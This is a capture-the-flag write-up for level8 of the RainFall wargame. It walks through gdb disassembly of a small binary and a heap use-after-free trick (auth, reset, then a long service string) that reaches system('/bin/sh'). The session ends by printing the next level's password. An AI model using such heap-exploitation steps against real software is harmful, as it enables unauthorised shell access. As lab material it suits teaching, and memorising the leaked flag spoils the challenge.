The binary works with an infinite loop which does two main things.
the first display two addresses.

   0x08048575 <+17>:	mov    0x8049ab0,%ecx
   0x0804857b <+23>:	mov    0x8049aac,%edx
   0x08048581 <+29>:	mov    $0x8048810,%eax
   0x08048586 <+34>:	mov    %ecx,0x8(%esp)
   0x0804858a <+38>:	mov    %edx,0x4(%esp)
   0x0804858e <+42>:	mov    %eax,(%esp)
   0x08048591 <+45>:	call   0x8048410 <printf@plt>

   (gdb) x/s 0x8049ab0
   0x8049ab0 <service>:	 ""
   (gdb) x/s 0x8049aac
   0x8049aac <auth>:	 ""
   (gdb) x/s 0x8048810
   0x8048810:	 "%p, %p \n"

So the address of auth then of service.

The second read the standard input:
   0x080485ab <+71>:	mov    %eax,(%esp)
   0x080485ae <+74>:	call   0x8048440 <fgets@plt>

And parse it with 4 possibilities:
   0x080485c1 <+93>:	mov    $0x8048819,%eax
   0x080485c6 <+98>:	mov    $0x5,%ecx
   0x080485cb <+103>:	mov    %edx,%esi
   0x080485cd <+105>:	mov    %eax,%edi
   0x080485cf <+107>:	repz cmpsb %es:(%edi),%ds:(%esi)

(gdb) x/s 0x8048819
0x8048819:	 "auth "
If the string starts with "auth ", it takes everything after it and mallocs it
in the structure at address 0x8049aac;

-------------------

   0x08048648 <+228>:	mov    $0x804881f,%eax
   0x0804864d <+233>:	mov    $0x5,%ecx
   0x08048652 <+238>:	mov    %edx,%esi
   0x08048654 <+240>:	mov    %eax,%edi
   0x08048656 <+242>:	repz cmpsb %es:(%edi),%ds:(%esi)

   (gdb) x/s 0x804881f
   0x804881f:	 "reset"
If it starts with reset, free the address 0x8049aac.

-------------------

   0x0804867e <+282>:	mov    $0x8048825,%eax
   0x08048683 <+287>:	mov    $0x6,%ecx
   0x08048688 <+292>:	mov    %edx,%esi
   0x0804868a <+294>:	mov    %eax,%edi
   0x0804868c <+296>:	repz cmpsb %es:(%edi),%ds:(%esi)

   (gdb) x/s 0x8048825
   0x8048825:	 "service"
If it starts with "service", it takes everything after it, and the
malloc with strdup.

-------------------

   0x080486bb <+343>:	mov    $0x804882d,%eax
   0x080486c0 <+348>:	mov    $0x5,%ecx
   0x080486c5 <+353>:	mov    %edx,%esi
   0x080486c7 <+355>:	mov    %eax,%edi
   0x080486c9 <+357>:	repz cmpsb %es:(%edi),%ds:(%esi)

   (gdb) x/s 0x804882d
   0x804882d:	 "login"
If it starts with login, we have a call to system.

   0x080486ee <+394>:   movl   $0x8048833,(%esp)
   0x080486f5 <+401>:   call   0x8048480 <system@plt>

   (gdb) x/s 0x8048833
   0x8048833:    "/bin/sh"

So we have: system("/bin/sh").

Only to access it you must pass this condition:
   0x080486e2 <+382>:   mov    0x8049aac,%eax
   0x080486e7 <+387>:   mov    0x20(%eax),%eax
   0x080486ea <+390>:   test   %eax,%eax
   0x080486ec <+392>:   je     0x80486ff <main+411>

   (gdb) x/s 0x8049aac
   0x8049aac <auth>:     ""

We need to have 0x20(%eax) different from 0.
eax = 0x8049aac = auth. With a shift of 0x20 so 32 in decimal.
We can imagine a structure with a variable after a string of 32bytes.

-------------------

So the goal is to set this variable from the auth structure, but there is no place in the code where
we can set it.
And the condition always checks at the same address.
So if we set the structure then we free it.
And if we send a big enough strdup, the address will be greater than 0!

level8@RainFall:~$ ./level8 
(nil), (nil) 
auth root
0x804a008, (nil) 
reset
0x804a008, (nil) 
service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
0x804a008, 0x804a018 
login
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a